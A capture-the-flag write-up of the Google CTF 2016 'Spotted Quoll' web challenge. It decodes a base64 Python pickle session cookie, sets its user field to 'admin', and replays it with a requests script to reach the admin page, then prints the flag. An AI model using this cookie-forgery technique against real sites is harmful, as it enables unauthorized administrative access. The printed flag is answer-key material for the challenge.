# Google CTF 2016 : Spotted Quoll

**Category:** Web
**Points:** 50
**Solves:** 413
**Description:**

[This](https://spotted-quoll.ctfcompetition.com/) blog on Zombie research looks like it might be interesting - can you break into the /admin section?


## Write-up

### Investigate
I start by enabling developer toolbar on Google Chrome and start capturing the network traffic.

I notice an 'Admin' button at the top of the page.  When I click on it, I just get redirected to the homepage and notice my URL bar updates as followed:
```
https://spotted-quoll.ctfcompetition.com/#err=user_not_found
```

However, I notice my browser downloaded a cookie at some point.

It looks like the cookie was retrieved from a 'GET' request at '/getCookie'.  This information will be useful when implemeting the script later.
```
Cookie obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu
```

I have heard of 'pickle' before.  It's a format for serializing data, usually over a network.  Very similar to JSON.  I tried loading the above data directly into pickle.  But unfortunately, it threw an exception.

However, the pickle could be simply encoded in another format, perhaps base64....
```
Base64:
KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu

PlainTxt:
(dp1
S'python'
p2
S'pickles'
p3
sS'subtle'
p4
S'hint'
p5
sS'user'
p6
Ns.
```

Ok, that looks a lot more like pickle data to me, let's load it up in Python.

### Code

Load the pickle data
```python
#Decode the base64 pickle
pickb64 = cookie['obsoletePickle']
pick = b64decode(pickb64)

#Write the pickle to a tmp file
tmpf = 'tmp.p'
f = open(tmpf, 'wb')
f.write(pick)
f.close()

#load the pickle
obsoletePickle = pickle.load(open('tmp.p', 'rb'))
print('%s' % str(obsoletePickle))
```

Print the pickle data
```
{'python': 'pickles', 'subtle': 'hint', 'user': None}
```

### Exploit
From the formatted pickle data, it should be pretty clear what's going on.  The 'user' field is set to None.  This is because we are not logged in.  I think we can trick the webiste!  Why don't we login as the admin by setting our 'user' attribute to 'admin'.

Modify the pickle data so that it reads...
```
{'python': 'pickles', 'subtle': 'hint', 'user': 'admin'}
```

Modify pickle data and dump back to raw data
```python
obsoletePickle['user'] = 'admin'

#Write to spoofed pickle to a new file
pickle.dump(obsoletePickle, open('spoofed.p', 'wb'))
spooff = 'spoofed.p'

#Read back as plain data
f = open(spooff, 'rb')
pick = f.read()
f.close()
```

Create the new cookie (encoded in base64)
```python
spoofed_cookie = dict(obsoletePickle=b64encode(pick))
```

Perform the attack to login to the admin page 'admin'
```
r = requests.get(URL + 'admin', verify=False, cookies=spoofed_cookie)
print(r.text)
```

### Script Output
```
HTML:
<html>
<head>
  <link href="/static/bootstrap.min.css" rel="stylesheet">
  <link href="/static/jumbotron-narrow.css" rel="stylesheet">
</head>
<body>

    <div class="container">
      <div class="header clearfix">
        <nav>
          <ul class="nav nav-pills pull-right">
            <li role="presentation" class="active"><a href="#">./boringblog</a></li>
            <li role="presentation"><a href="/admin">Admin</a></li>
          </ul>
        </nav>
        <h3 class="text-muted">yawn</h3>
      </div>

      <div class="jumbotron">
        <h1>My Zombie Research Project</h1>
        <p class="lead">./boringblog</p>
      </div>

      <div class="row marketing">
        <div class="col-lg-12">
          <h3>Blog Development - 20th January, 2016</h3>
          <p>I don't have much content yet, except for my admin page. Stay tuned for more information</p>
        </div>
      </div>
      <iframe style="border: 0;" src="/getCookie"></iframe>
    </div> <!-- /container -->

</body>
</html>

Cookies:
<RequestsCookieJar[<Cookie obsoletePickle=KGRwMQpTJ3B5dGhvbicKcDIKUydwaWNrbGVzJwpwMwpzUydzdWJ0bGUnCnA0ClMnaGludCcKcDUKc1MndXNlcicKcDYKTnMu for spotted-quoll.ctfcompetition.com/>]>

Real Pickle:
{'python': 'pickles', 'subtle': 'hint', 'user': None}

Spoofed Admin Pickle:
{'python': 'pickles', 'subtle': 'hint', 'user': 'admin'}

Your flag is CTF{but_wait,theres_more.if_you_call} ... but is there more(1)? or less(1)?
```

Flag
```
CTF{but_wait,theres_more.if_you_call}
```

[Python script](https://github.com/b0tchsec/CTF-Fanny-Pack/blob/master/solutions/google_2016/SpottedQuoll/pwn.py)
